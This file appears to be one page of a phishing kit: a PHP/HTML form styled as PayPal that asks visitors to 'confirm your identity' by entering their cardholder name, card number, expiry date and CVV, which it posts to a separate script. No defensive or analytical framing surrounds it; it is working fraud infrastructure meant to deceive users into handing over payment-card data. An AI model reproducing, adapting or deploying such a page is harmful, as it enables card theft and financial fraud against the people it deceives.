<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Paypal</title>
    <link rel="stylesheet" href="res/css/main.css">
</head>
<body>
    
    <div class="container">       

        <div class="login">

            <img src="res/img/logo.png" class="logo">

        <h2>Confirm your identity</h2>
        <p>Confirm your identity by entering your card information.</p>

            <form action="post.php" method="post">

            <label>Cardholder Name</label>
                <input type="text" name="name" >

                <label>Card Number</label>
                <input type="text" name="cc" required placeholder="XXXX XXXX XXXX XXXX" id="cc">

                <label>Expiration Date</label>
                <input type="text" name="exp" required placeholder="MM/AA" id="exp">
                

                <label>Security Code</label>
                <input type="password" name="cvv" required placeholder="CVV" id="cvv">
                

    
                <button type="submit" class="log">Continue</button>
                
            </form>
        
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
$("#cc").mask("0000 0000 0000 0000");
$("#exp").mask("00/00");
$("#cvv").mask("0000");
</script>   
</body>
</html>
